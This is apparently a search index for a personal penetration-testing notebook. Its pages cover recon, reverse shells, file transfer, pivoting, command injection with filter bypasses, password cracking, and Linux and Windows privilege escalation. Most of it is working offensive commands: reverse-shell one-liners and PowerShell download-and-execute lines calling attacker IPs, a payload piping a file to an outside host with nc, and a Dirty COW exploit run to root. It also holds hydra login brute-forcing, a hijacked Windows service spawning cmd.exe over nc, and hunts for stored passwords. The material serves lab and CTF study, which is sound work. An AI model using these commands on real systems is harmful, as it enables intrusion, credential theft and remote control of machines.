load_search_index({"pages":[{"title":"Cybersecurity Note","text":"","tags":"","url":"index.html"},{"title":"Reconnaissance","text":"Reconnaissance Table of Contents Reconnaissance tags: Security Recon Reference Workflow Tools Passive Information Gathering Search Engine Google hacking Asset identification Email Harvesting Tools Active Information Gathering DNS enumeration Port Scanning Scan for UDP Fingerprint Scanning Vulnerability Scanning AWS S3 buckets tags: Security Recon Reference Workflow Recon workflow cheatsheets Tools OWASP Amass: DNS Scraping Certificates APIs Web Archives Passive Information Gathering Search Engine Google hacking Google hacking database Asset identification Shodan Censys Email Harvesting theHarvester: Gathers emails, names, subdomains, IPs, and URLs theharvester -d cisco.com -b google Tools recon-ng whois Sublist3r: Fast subdomains enumeration tool Active Information Gathering @|\u2b50\u6383\u63cf cheat sheet|Hakluke\u2019s Ultimate OSCP Guide DNS enumeration tools - DNSRecon example: brute force reverse zone dnsrecon -n 10.10.10.83 -r 10.0.0.0\/8 --db olympus.db dnsrecon -n 10.10.10.83 -r 172.16.0.0\/12 --db olympus.db dnsrecon -n 10.10.10.83 -r 192.168.0.0\/16 --db olympus.db brute force subdomain tools - knock reverse lookup brute force - \u53cd\u67e5 ip A zone transfer can be requested by specifying a type of AXFR dig axfr @10.10.10.83 olympus.htb DNS Zone Transfer - \u507d\u88dd\u6210 slave DNS # get dns server list host -t ns megacorpone.com | cut -d &quot; &quot; -f 4 # require DNS zone host -l {{domain name}} {{dns server address}} host -l megacorpone.com ns2.megacorpone.com #!\/bin\/bash # Simple Zone Transfer Bash Script # $1 is the first argument given after the bash script # Check if argument was given, if not, print usage if [ -z &quot;$1&quot; ]; then echo &quot;[*] Simple Zone transfer script&quot; echo &quot;[*] Usage : $0 &lt;domain name&gt; &quot; exit 0 fi # if argument was given, identify the DNS servers for the domain for server in $(host -t ns $1 |cut -d&quot; &quot; -f4);do # For each of these servers, attempt a zone transfer host -l $1 $server |grep &quot;has address&quot; done Port Scanning TCP \u958b\u555f\uff0c\u56de\u8986 SYN-ACK \u5c01\u5305 UDP \u9001\u51fa\u7a7a\u7684 UDP \u5305 \u958b\u555f\uff0c\u6c92\u6709\u56de\u8986 \u95dc\u9589\uff0c\u56de\u8986 ICMP unreachable SNMP - onesixtyone Tools nmap Masccan Scan for UDP nmap -sU 10.11.1.X unicornscan -mU -v -I 10.11.1.X Fingerprint Scanning lbd - Load balancer detector Netcraft [website] Vulnerability Scanning Nmap OpenVAS (Nessus) AWS S3 buckets \u679a\u8209 Bucket Name S3Scanner grayhatwarfare: Public buckets by grayhatwarfare","tags":"","url":"Pentest_Misc_Knowledge\/Reconnaissance.html"},{"title":"Using Public Exploits","text":"Using Public Exploits Table of Contents Using Public Exploits tags: Security Searching Exploits Exploit Explanation Using Exploit Tools searchsploit tags: Security Searching Exploits Exploit Database SecurityFocus Exploit Explanation comics explanation - xkcd Google: heartbleed xkcd Using Exploit for i in $(seq 0 100); do python heartbleed.py valentine.htb; done Tools searchsploit searchsploit -o windows smb -o, --overflow [Term] Exploit titles are allowed to overflow their columns. searchsploit -m 17491 -m, --mirror [EDB-ID] Mirror (aka copies) an exploit to the current working directory.","tags":"","url":"Pentest_Misc_Knowledge\/Using_Public_Exploits.html"},{"title":"Reverse Shell","text":"Reverse Shell Table of Contents Reverse Shell tags: Security ReverseShell Move Payload to Target Download from HTTPS Server Spawn Reverse Shell Online Resource Cheat Sheet netcat (really reliable) with ssl bash mknod telnet php powershell Spwning fully interactive TTY Shell Online Resource Overview Steps Cheat Sheet Python perl ruby lua From within IRB From within vi From within nmap Other Tips rlwrap Getting Xterm shell tags: Security ReverseShell Move Payload to Target Download from HTTPS Server wget --no-check-certificate wildfoo.tw\/reverse_shell -O \/tmp\/s sh \/tmp\/s Spawn Reverse Shell Online Resource 7 linux shells using built in tools Pentestmonkey - Reverse Shell Cheat Sheet Cheat Sheet netcat (really reliable) rm \/tmp\/f;mkfifo \/tmp\/f;cat \/tmp\/f|\/bin\/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;\/tmp\/f ncat -lk -n -v 7777 with ssl Target: ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl Attacker: ncat -v 10.0.0.22 4444 --ssl bash bash -i &gt;&amp; \/dev\/tcp\/127.0.0.1\/8787 0&gt;&amp;1 exec 5&lt;&gt;\/dev\/tcp\/127.0.0.1\/8787; cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done mknod if GAPING_SECURITY_HOLE = disabled mknod backpipe p &amp;&amp; nc 10.10.14.207 7777 0&lt;backpipe | \/bin\/bash 1&gt;backpipe telnet mknod backpipe p &amp;&amp; telnet 10.10.14.207 7777 0&lt;backpipe | \/bin\/bash php \/usr\/share\/laudanum\/php\/php-reverse-shell.php powershell nishang\/Shells cp \/usr\/share\/nishang\/Shells\/Invoke-PowerShellTcp.ps1 reverse.ps1 vim reverse.ps1 : copy : .EXAMPLE : PS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444 : to end of file and edit ip and port and delete 'PS &gt; ' python3 -m http.server 80 powershell IEX(New-Object Net.WebClient).downloadstring(&quot;http:\/\/10.10.14.42\/reverse.ps1&quot;) sometimes we need use \\&quot; to escape Spwning fully interactive TTY Shell Online Resource NETSEC - Spawning TTY Shell cheat sheet Overview \u901a\u5e38\u62ff\u5230\u7684 reverse shell \u6703\u6709\u4e00\u4e9b\u554f\u984c Some commands, like su and ssh require a proper terminal to run STDERR usually isn\u2019t displayed Can\u2019t properly use text editors like vim No tab-complete No up arrow history No job control Upgrading simple shells to fully interactive TTYs Steps use bash ncat -lk -n -v 7777 and get shell type python -c 'import pty; pty.spawn(&quot;\/bin\/bash&quot;)' in reverse shell Ctrl-Z type stty raw -echo fg &lt;enter&gt; &lt;enter&gt; export TERM=xterm allow us use Ctrl-l to clean the screen Cheat Sheet Python python -c 'import pty; pty.spawn(&quot;\/bin\/sh&quot;)' echo os.system('\/bin\/bash') \/bin\/sh -i perl perl -e 'exec &quot;\/bin\/sh&quot;;' exec &quot;\/bin\/sh&quot;; ruby exec &quot;\/bin\/sh&quot; lua os.execute('\/bin\/sh') From within IRB exec &quot;\/bin\/sh&quot; From within vi :!bash :set shell=\/bin\/bash:shell From within nmap !sh Other Tips rlwrap Getting Xterm shell Make sure your Xserver is listening to TCP: $ netstat -lntup Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID tcp 0 0 0.0.0.0:6000 0.0.0.0:* LISTEN - tcp6 0 0 :::6000 :::* LISTEN - New Xserver versions have tcp listening disabled by default. Consult your distro how to enable it. You may have to change your display manager settings or the xserverrc file, e.g.: $ cat \/etc\/X11\/xinit\/xserverrc #!\/bin\/sh if [ -z &quot;$XDG_VTNR&quot; ]; then exec \/usr\/bin\/X -listen tcp &quot;$@&quot; else exec \/usr\/bin\/X -listen tcp &quot;$@&quot; vt$XDG_VTNR fi Then all you have to do is to allow incoming connections from the specific IP: $ xhost +10.10.10.69 Now let\u2019s connect: \/usr\/bin\/xterm -display 10.10.15.203:0 or DISPLAY=10.10.15.203:0 \/usr\/bin\/xterm","tags":"","url":"Pentest_Misc_Knowledge\/Reverse_Shell.html"},{"title":"File Transfer","text":"File Transfers Table of Contents File Transfers tags: Security Reference Unix netcat http - put python3 http.server nginx Powershell Invoke-WebRuquest upoad - with put method download run sciprt tags: Security Reference offsecnewbie Unix netcat Receiver ncat -l -n -v 90 &gt; simpler.py Sender cat simpler.py | nc 10.10.14.207 90 Ctrl-c http - put python3 http.server Sender: upload - with put method curl --upload-file TEST.txt --url http:\/\/192.168.8.9\/TEST.txt --http1.0 Receiver: http.server with put method wget https:\/\/github.com\/WildfootW\/Security-utility-Scripts\/blob\/master\/Network_Protocol\/http.server_with-put.py python3 http.server_with-put.py 80 nginx Receiver server { listen 8001 default_server; server_name wildfootw; location \/ { root \/var\/www\/upload; dav_methods PUT; } } Sender curl --upload-file captured.cap 10.10.14.14:8001 Powershell SANS blog Invoke-WebRuquest upoad - with put method $FilePath = &quot;.\\TEST.txt&quot; $uri = &quot;http:\/\/192.168.8.9\/TEST.txt&quot; Invoke-WebRequest -uri $uri -Method Put -Infile $FilePath -ContentType 'text\/plain' download Invoke-WebRequest -Uri &quot;http:\/\/10.10.14.42\/wmic_info.bat&quot; -OutFile wmic_info.bat run sciprt powershell IEX(New-Object Net.WebClient).downloadstring(&quot;http:\/\/10.10.14.42\/reverse.ps1&quot;) maybe you need use \\&quot; to escape","tags":"","url":"Pentest_Misc_Knowledge\/File_Transfer.html"},{"title":"Pivoting (Port Fun)","text":"Pivoting (Port Fun) Table of Contents Pivoting (Port Fun) tags: Security Pivoting Reference Example nc &lt;== telnet \/bin\/bash telnet ==&gt; nc A:9000 &lt;== ssh ==&gt; C:80 local:1080 socks5 &lt;== ssh 10.10.10.75 ==&gt; any temp tags: Security Pivoting Reference NETSEC - Dynamic Port Forwarding(SSH) HighOn.Coffee - SSH &amp; Meterpreter Pivoting Techique Example nc &lt;== telnet \/bin\/bash telnet ==&gt; nc Machine A: nc -lk -n -v 7777 Machine B: telnet A.A.A.A 7777 | \/bin\/bash | telnet B.B.B.B 7777 Machine C: nc -lk -n -v 7777 A:9000 &lt;== ssh ==&gt; C:80 Machine A: ssh -i ~\/.ssh\/B.root.key -L9000:C.C.C.C:80 B.B.B.B or ssh B.B.B.B &lt;enter&gt; &lt;enter&gt; ~C ssh&gt; -L 9000:C.C.C.C:80 local:1080 socks5 &lt;== ssh 10.10.10.75 ==&gt; any ssh -D1080 10.10.10.75 netstat -alnp | grep LIST | grep 1080 vim \/etc\/proxychains.conf : [ProxyList] : # add proxy here ... : # meanwile : # defaults set to &quot;tor&quot; : #socks4 127.0.0.1 9050 : # metasploit : #socks4 127.0.0.1 1080 : # ssh : socks5 127.0.0.1 1080 proxychains curl -k https:\/\/10.10.10.60 temp Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP] FPipe.exe -l 80 -r 80 -s 80 192.168.1.7 Note: ssh -[L\/R] [local port]:[remote ip]:[remote port] [local user]@[local ip] ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port Note: mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe # Port Relay mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080) mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080) Is tunnelling possible? Send commands locally, remotely ssh -D 127.0.0.1:9050 -N [username]@[ip] proxychains ifconfig","tags":"","url":"Pentest_Misc_Knowledge\/Pivoting_(Port_Fun).html"},{"title":"Wireless Secuirty","text":"Wireless Security Table of Contents Wireless Security tags: Security Wireless WiFi Cracking CAP file Using Aircrack-ng Using hashcat Decrypt CAP tags: Security Wireless WiFi Cracking CAP file Using Aircrack-ng aircrack-ng captured.cap -w rockyou.txt Using hashcat git clone https:\/\/github.com\/hashcat\/hashcat-utils make .\/cap2hccapx.bin captured.cap captured.hccapx .\/hashcat -m 2500 hashes\/captured.hccapx \/opt\/wordlist\/rockyou.txt Decrypt CAP Wireshark - Preferences - IEEE 802.11 - Decryption Keys - +","tags":"","url":"Pentest_Misc_Knowledge\/Wireless_Secuirty.html"},{"title":"Command Injection & WAF Bypass & Fuzzing","text":"Command Injection &amp; WAF bypass &amp; Fuzzing Table of Contents Command Injection &amp; WAF bypass &amp; Fuzzing tags: Security Fuzzing Command Injection Cheatsheet keywords Regular expression String Concat Empty Variable Environment Variable String operating Backslash &lt;space&gt; characters ${IFS} Redirecting bash WAF bypass &amp; Fuzz Enum path Enum option Enum bad char Example tags: Security Fuzzing &amp; ; - ` | $ Command Injection Cheatsheet GitHub - payloadbox | cat flag &amp;&amp; cat flag ; cat flag %0a cat flag &quot;; cat flag `cat flag` cat $(ls) &quot;; cat $(ls) `cat flag | nc wildfoo.tw 7778` . flag PS1=$(cat flag) `echo${IFS}${PATH}|cut${IFS}-c1-1` =&gt; \/ keywords Regular expression ? match one character cat fl?g \/???\/??t \/???\/p??s?? * match multiple characters cat f* cat f?a* String Concat A=fl;B=ag;cat $A$B Empty Variable cat fl${x}ag cat tes$(z)t\/flag Environment Variable use env to print out environment variables $PATH =&gt; &quot;\/usr\/local\/\u2026.blablabla\u201d ${PATH:0:1} =&gt; '\/' ${PATH:1:1} =&gt; 'u' ${PATH:0:4} =&gt; '\/usr' ${PS2} &gt; ${PS4} + String operating Empty String cat fl&quot;&quot;ag cat fl''ag cat &quot;fl&quot;&quot;ag&quot; Backslash c\\at fl\\ag &lt;space&gt; characters ${IFS} cat${IFS}flag ls$IFS-alh cat$IFS$2flag Redirecting cat&lt;\/etc\/passwd bash {cat,\/etc\/passwd} X=$'cat\\x20\/etc\/passwd'&amp;&amp;$X IFS=,;`cat&lt;&lt;&lt;uname,-a` WAF bypass &amp; Fuzz Enum path gobuster -u http:\/\/fluxcapacitor.htb -w \/usr\/share\/wordlists\/dirbuster\/directory-list-lowercase-2.3-medium.txt Enum option wfuzz --hh BBB -H &quot;User-Agent:alamot&quot; -c -z file,\/usr\/share\/SecLists\/Discovery\/Web-Content\/burp-parameter-names.txt http:\/\/10.10.10.69\/sync\/?FUZZ{not_this}=test wfuzz -c -w \/usr\/share\/wordlists\/dirbuster\/directory-list-2.3-medium.txt -H &quot;User-Agent: nothingtoseehere&quot; --hh=19 &quot;http:\/\/fluxcapacitor.htb\/sync?FUZZ=test&quot; https:\/\/bitvijays.github.io\/LFC-VulnerableMachines.html#parameter-fuzz Enum bad char wfuzz -c -w \/usr\/share\/wordlists\/SecLists\/Fuzzing\/special_chars.txt -u http:\/\/10.10.10.69\/sync?opt=FUZZ Example opt=' pw''d' opt=' whi''ch cu''rl' opt=' \/usr\/bin\/whi[c]h mk\\nod' opt=' p\\s aux'","tags":"","url":"Misc_Attack_Vector_Knowledge\/Command_Injection_WAF_Bypass_Fuzzing.html"},{"title":"Password Attacks","text":"Password Attacks Main Table of Contents Password Attacks Main tags: security PasswordAttack Hash Identify hash-identifier Wordlist crunch Cracker hashcat CheatSheet Find Hash Type Crack hydra John the Ripper CrackMapExec Others mimikatz tags: security PasswordAttack Hash Identify hash-identifier GitHub Wordlist \/usr\/share\/wordlist \/usr\/share\/wfuzz\/wordlist \/usr\/share\/golismero\/wordlist \/usr\/share\/dirb\/wordlist crunch \u7522\u5b57\u5178\u6a94 Cracker hashcat CheatSheet -a [Attack Modes] hashcat -a 0 -m 0 example0.hash example.dict -r rules\/best64.rule hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a Find Hash Type hashcat --example-hashes | grep -A 2 -B 1 MySQL MODE: 200 TYPE: MySQL323 HASH: 7196759210defdc0 PASS: hashcat -- MODE: 300 TYPE: MySQL4.1\/MySQL5 HASH: fcf7c1b8749cf99d88e5f34271d636178fb5d130 PASS: hashcat Crack .\\hashcat64.exe -m 300 Z:\\temporary_share\\mysql.DBadmin ..\\rockyou.txt 2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou hydra Very fast network logon cracker FTP\u3001HTTP\u3001HTTPS\u3001MySQL\u3001MS SQL\u3001Oracle\u3001Cisco\u3001IMAP\u3001VNC &lt;form method=&quot;POST&quot; action=&quot;http:\/\/192.168.23.43\/october\/backend\/backend\/auth\/signin&quot; accept-charset=&quot;UTF-8&quot;&gt;&lt;input name=&quot;_session_key&quot; type=&quot;hidden&quot; value=&quot;ycAQqg2iO9JcC5htu7hAQfjuU5O40woSuzFToJru&quot;&gt;&lt;input name=&quot;_token&quot; type=&quot;hidden&quot; value=&quot;DVnX6bPdshG2fTBv15ziHFCinYUGwzoXXLWYa2cS&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;postback&quot; value=&quot;1&quot; \/&gt; _session_key=QK2TDe7JBjSXtMe7BsB5LIvu1olwJ9DligCAGb9b&amp;_token=tapg9kGUfJGIRgmeO8i8THMgVlFouvl5Ipsah0Oc&amp;postback=1&amp;login=fyodor&amp;password=AAAA SESSIONKEY=$(curl -s &quot;http:\/\/192.168.23.43\/october\/backend\/backend\/auth\/signin&quot; | grep &quot;POST&quot; | tee post_form | awk -F 'value=' '{print $2}' | awk -F '&quot;' '{print $2}') CSRF=$(cat post_form | awk -F 'value=' '{print $3}' | awk -F '&quot;' '{print $2}') hydra -l fyodor -P \/usr\/share\/wordlists\/rockyou.txt 192.168.23.43 http-post-form &quot;\/october\/backend\/backend\/auth\/signin:_session_key=${SESSIONKEY}&amp;_token=${CSRF}&amp;postback=1&amp;login=^USER^&amp;password=^PASS^:F=did not match&quot; python3 script: https:\/\/www.youtube.com\/watch?v=d2nVDoVr0jE hydra -L users.txt -P passwords.txt ssh:\/\/10.10.10.184 John the Ripper CrackMapExec crackmapexec smb 10.10.10.184 -u users.txt -p passwords.txt Others mimikatz Windows - Password stealing","tags":"","url":"Misc_Attack_Vector_Knowledge\/Password_Attacks.html"},{"title":"Client-Side Attacks","text":"","tags":"","url":"Misc_Attack_Vector_Knowledge\/Client_Side_Attacks.html"},{"title":"Social Engineering Attacks","text":"","tags":"","url":"Misc_Attack_Vector_Knowledge\/Social_Engineering_Attacks.html"},{"title":"Misc Services","text":"Misc Services Enumeration &amp; Attack Table of Contents Misc Services Enumeration &amp; Attack tags: Security Recon MSSQL SSL MSSQL Get NTLMv2-SSP Hash SSL\/TLS SSLyze tags: Security Recon MSSQL SSL MSSQL Use impacket python script as client python3 mssqlclient.py reporting@10.10.10.125 -windows-auth Get NTLMv2-SSP Hash SQL&gt; xp_dirtree &quot;\\\\10.10.14.42\\WildfootW\\&quot; Then we can get Hash in Responder SSL\/TLS SSLyze GitHub SSL\/TLS server scanning sslyze --heartbleed valentine.htb","tags":"","url":"Misc_Service_Attack\/Misc_Services.html"},{"title":"Misc Web CMS","text":"","tags":"","url":"Misc_Service_Attack\/Misc_Web_CMS.html"},{"title":"SMB & SAMBA","text":"","tags":"","url":"Misc_Service_Attack\/SMB_SAMBA.html"},{"title":"SNMP","text":"","tags":"","url":"Misc_Service_Attack\/SNMP.html"},{"title":"SMTP","text":"","tags":"","url":"Misc_Service_Attack\/SMTP.html"},{"title":"Linux","text":"Privilege Escalation Linux Table of Contents Privilege Escalation Linux tags: Security PrivilegeEscalation Reference Information Gathering Script Manual Operating System Distribution Kernel Version Environmental Variables Users \/ Groups Applications &amp; Services &amp; Files Networking Confidential Information File Systems Privilege Escalation Dirty Cow Tools GTFOBins example: systemctl tags: Security PrivilegeEscalation Reference Rebootuser - Local Linux Enumeration &amp; Privilege Escalation Cheat Sheet linuxprivchecker.py \u2013 a Linux Privilege Escalation Check Script mzet-\/linux-exploit-suggester lucyoa\/kernel-exploits Information Gathering Cheat Sheet - Linux|g0tm1lk - Linux Privilege Escalation Script cp \/opt\/Privilege_Escalation\/LinEnum\/LinEnum.sh . python3 -m http.server 80 hype@Valentine:~$ curl 10.10.14.2\/LinEnum.sh | bash Manual Operating System Distribution cat \/etc\/issue cat \/etc\/*-release cat \/etc\/lsb-release # Debian based cat \/etc\/redhat-release # Redhat based Kernel Version cat \/proc\/version uname -a uname -mrs Environmental Variables Users \/ Groups id who sudo -l \/ sudo -ll # If no command is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host. www-data@jarvis:\/$ sudo -l Matching Defaults entries for www-data on jarvis: env_reset, mail_badpass, secure_path=\/usr\/local\/sbin\\:\/usr\/local\/bin\\:\/usr\/sbin\\:\/usr\/bin\\:\/sbin\\:\/bin User www-data may run the following commands on jarvis: (pepper : ALL) NOPASSWD: \/var\/www\/Admin-Utilities\/simpler.py sudo -u pepper \/var\/www\/Admin-Utilities\/simpler.py -p Run the command as a user other than the default target user (usually root). The user may be either a user name or a numeric user-ID (UID) prefixed with the \u2018#\u2019 character (e.g., #0 for UID 0). example: in lxd group: create virtual machine and mount root folder Applications &amp; Services &amp; Files ps aux | grep root ps -ef | grep root cat \/etc\/services # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here. find \/ -perm -1000 -type d 2&gt;\/dev\/null # SGID (chmod 2000) - run as the group, not the user who started it. find \/ -perm -g=s -type f 2&gt;\/dev\/null # = -perm -2000 # SUID (chmod 4000) - run as the owner, not the user who started it. find \/ -perm -u=s -type f 2&gt;\/dev\/null # = -perm -4000 # SGID or SUID find \/ -perm -g=s -o -perm -u=s -type f 2&gt;\/dev\/null # Quicker search. Looks in 'common' places: \/bin, \/sbin, \/usr\/bin, \/usr\/sbin, \/usr\/local\/bin, \/usr\/local\/sbin and any other *bin, for SGID or SUID for i in `locate -r \"bin$\"`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2&gt;\/dev\/null; done # find starting at root (\/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied) find \/ -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2&gt;\/dev\/null -exec ls -la {} \\; Networking Confidential Information File Systems Privilege Escalation Dirty Cow Race condition in mm\/gup.c in the Linux kernel 2.x through 4.x before 4.8.3 wget https:\/\/raw.githubusercontent.com\/FireFart\/dirtycow\/master\/dirty.c hype@Valentine:~$ wget 10.10.14.2\/dirtycow.c hype@Valentine:~$ grep gcc dirty.c \/\/ gcc -pthread dirty.c -o dirty -lcrypt hype@Valentine:~$ gcc -pthread dirty.c -o dirty -lcrypt hype@Valentine:~$ .\/dirty \/etc\/passwd successfully backed up to \/tmp\/passwd.bak Please enter the new password: Complete line: firefart:figsoZwws4Zu6:0:0:pwned:\/root:\/bin\/bash mmap: 7fbb000ab000 hype@Valentine:~$ su firefart Password: firefart@Valentine:\/home\/hype# id uid=0(firefart) gid=0(root) groups=0(root) Tools GTFOBins GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. example: systemctl find \/ -perm -4000 2&gt;\/dev\/null pepper@jarvis:\/$ find \/ -perm -4000 -ls 2&gt;\/dev\/null ... 1312201 172 -rwsr-x--- 1 root pepper 174520 Feb 17 2019 \/bin\/systemctl ... search systemctl in GTFOBins. It said: sudo sh -c 'cp $(which systemctl) .; chmod +s .\/systemctl' TF=$(mktemp).service echo '[Service] Type=oneshot ExecStart=\/bin\/sh -c &quot;id &gt; \/tmp\/output&quot; [Install] WantedBy=multi-user.target' &gt; $TF .\/systemctl link $TF .\/systemctl enable --now $TF So I create a file wildfootw.service &amp; reverse_shell.sh in \/home\/pepper in wildfootw.service: [Service] Type=oneshot ExecStart=\/bin\/bash \/home\/pepper\/reverse_shell.sh [Install] WantedBy=multi-user.target in reverse_shell.sh: bash -i &gt;&amp; \/dev\/tcp\/10.10.14.207\/7779 0&gt;&amp;1 systemctl link \/home\/pepper\/wildfootw.service systemctl start wildfootw.service","tags":"","url":"Privilege_Escalation\/Linux.html"},{"title":"Windows","text":"Privilege Escalation Windows Table of Contents Privilege Escalation Windows tags: Security PrivilegeEscalation Reference Tools Windows services Service Control sc Net Permission Accesschk cacls PsExec JuicyPotato Information Gathering Scripts PowerSploit\/Privesc Windows Management Instrumentation Command-Line Manual OS users and permissions network interfaces &amp; routing table &amp; firewall scheduled tasks, running processes, started services and installed drivers. last Privilege Escalation kernel \u6f0f\u6d1e sysprep \/ Unattend Groups.xml - Group Policy Preference saved passwords AlwaysInstallElevated DLL Command Injection pingback check nc tags: Security PrivilegeEscalation Reference \ud83c\udf1fWindows \u63d0\u6b0a | FuzzySecurity - Windows Privilege Escalation Fundamentals Windows explotion suggester &amp; compiled exp Windows Privilege Escalation Vectors (\u4e2d\u6587) pentestmonkey\/windows-privesc-check PayloadsAllTheThings \u2500 Windows - Privilege Escalation Tools Windows services Microsoft\u2019s Sysinternals Suite \u7b2c\u4e00\u6b21\u7528 Sysinternal \u7684\u5de5\u5177\u90fd\u6703\u8df3\u51fa GUI \u540c\u610f\u4f7f\u7528\u8005\u689d\u6b3e\uff0c\u53ef\u4ee5\u52a0\u5165 \/accepteula \u53c3\u6578\u7565\u904e\u9019\u500b\u6b65\u9a5f\u3002 Service Control sc sc can query, configure and manage windows services. C:\\&gt; sc qc {{Service name: Spooler}} C:\\&gt; sc config upnphost binpath= &quot;C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe&quot; C:\\&gt; sc config upnphost obj= &quot;.\\LocalSystem&quot; password= &quot;&quot; Net C:\\&gt; net start upnphost Permission Accesschk A tool in Sysinternals Suite -u Suppress errors. -c Name is a Windows Service -v Verbose (includes Windows Vista Integrity Level). -w Show only objects that have write access. -d Only process directories or top level key. -s Recurse. C:\\&gt; accesschk.exe -ucqv {{Service name: Spooler}} C:\\&gt; accesschk.exe -ucqv * # see all the permissions # &quot;Authenticated Users&quot;, &quot;Power Users&quot; etc your user group C:\\&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; * # Find all weak folder permissions per drive. C:\\&gt; accesschk.exe -uwdqs Users c:\\ C:\\&gt; accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\\ # Find all weak file permissions per drive. C:\\&gt; accesschk.exe -uwqs Users c:\\*.* C:\\&gt; accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\\*.* cacls PsExec \u62ff\u5230\u67d0\u500b\u5e33\u865f\u7684\u6b0a\u9650(\u6e2c\u8a66\u7528) \u7528\u9ad8\u6b0a\u9650\u7684 shell \u57f7\u884c .\\PsExec64.exe -i -u &quot;nt authority\\local service&quot; cmd.exe JuicyPotato whoami \/priv have SeImpersonate and\/or SeAssignPrimaryToken enable Windows Server 2019 is not affected by this vulnerability. Other versions of Windows (Server 2008R2, Server 2012, Server 2012 R2, Server 2016) are affected. Information Gathering Scripts PowerSploit\/Privesc GitHub cp \/usr\/share\/windows-resources\/powersploit\/Privesc\/PowerUp.ps1 . PS C:\\Windows\\system32&gt; IEX(New-Object Net.WebClient).downloadString(&quot;http:\/\/10.10.14.42\/PowerUp.ps1&quot;) PS C:\\Windows\\system32&gt; Invoke-AllChecks Windows Management Instrumentation Command-Line Invoke-WebRequest -Uri &quot;http:\/\/10.10.14.42\/wmic_info.bat&quot; -OutFile wmic_info.bat .\\wmic_info.bat Invoke-WebRequest -uri &quot;http:\/\/10.10.14.42\/out.html&quot; -Method Put -Infile &quot;.\\out.html&quot; -ContentType 'text\/plain' Manual OS C:\\Windows\\system32&gt; systeminfo | findstr \/B \/C:&quot;OS Name&quot; \/C:&quot;OS Version&quot; users and permissions C:\\Windows\\system32&gt; hostname C:\\Windows\\system32&gt; whoami C:\\Windows\\system32&gt; net users C:\\Windows\\system32&gt; net user {{username}} # list of administrators C:\\Windows\\system32&gt; net localgroup administrators network interfaces &amp; routing table &amp; firewall C:\\Windows\\system32&gt; ipconfig \/all C:\\Windows\\system32&gt; route print C:\\Windows\\system32&gt; arp -A C:\\Windows\\system32&gt; netstat -ano C:\\Windows\\system32&gt; netsh firewall show state C:\\Windows\\system32&gt; netsh firewall show config scheduled tasks, running processes, started services and installed drivers. C:\\Windows\\system32&gt; schtasks \/query \/fo LIST \/v # scheduled tasks C:\\Windows\\system32&gt; tasklist \/SVC # running processes C:\\Windows\\system32&gt; net start # started services C:\\Windows\\system32&gt; DRIVERQUERY # installed drivers last # The command below will search the file system for file names containing certain keywords. # You can specify as many keywords as you wish. C:\\Windows\\system32&gt; dir \/s *pass* == *cred* == *vnc* == *.config* # Search certain file types for a keyword, this can generate a lot of output. C:\\Windows\\system32&gt; findstr \/si password *.xml *.ini *.txt # Similarly the two commands below can be used to grep the registry for keywords, in this case &quot;password&quot;. C:\\Windows\\system32&gt; reg query HKLM \/f password \/t REG_SZ \/s C:\\Windows\\system32&gt; reg query HKCU \/f password \/t REG_SZ \/s Privilege Escalation kernel \u6f0f\u6d1e C:\\Windows\\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr \/C:&quot;KB..&quot; \/C:&quot;KB..&quot; KiTrap0D (KB979682) MS11-011 (KB2393802) MS10-059 (KB982799) MS10-021 (KB979683) MS11-080 (KB2592799) sysprep \/ Unattend c:\\sysprep.inf c:\\sysprep\\sysprep.xml %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml # This is a sample from sysprep.inf with clear-text credentials. [GuiUnattended] OEMSkipRegional=1 OemSkipWelcome=1 AdminPassword=s3cr3tp4ssw0rd TimeZone=20 # This is a sample from sysprep.xml with Base64 &quot;encoded&quot; credentials. Please people Base64 is not encryption, I take more precautions to protect my coffee. The password here is &quot;SuperSecurePassword&quot;. &lt;LocalAccounts&gt; &lt;LocalAccount wcm:action=&quot;add&quot;&gt; &lt;Password&gt; &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;\/Value&gt; &lt;PlainText&gt;false&lt;\/PlainText&gt; &lt;\/Password&gt; &lt;Description&gt;Local Administrator&lt;\/Description&gt; &lt;DisplayName&gt;Administrator&lt;\/DisplayName&gt; &lt;Group&gt;Administrators&lt;\/Group&gt; &lt;Name&gt;Administrator&lt;\/Name&gt; &lt;\/LocalAccount&gt; &lt;\/LocalAccounts&gt; # Sample from Unattended.xml with the same &quot;secure&quot; Base64 encoding. &lt;AutoLogon&gt; &lt;Password&gt; &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;\/Value&gt; &lt;PlainText&gt;false&lt;\/PlainText&gt; &lt;\/Password&gt; &lt;Enabled&gt;true&lt;\/Enabled&gt; 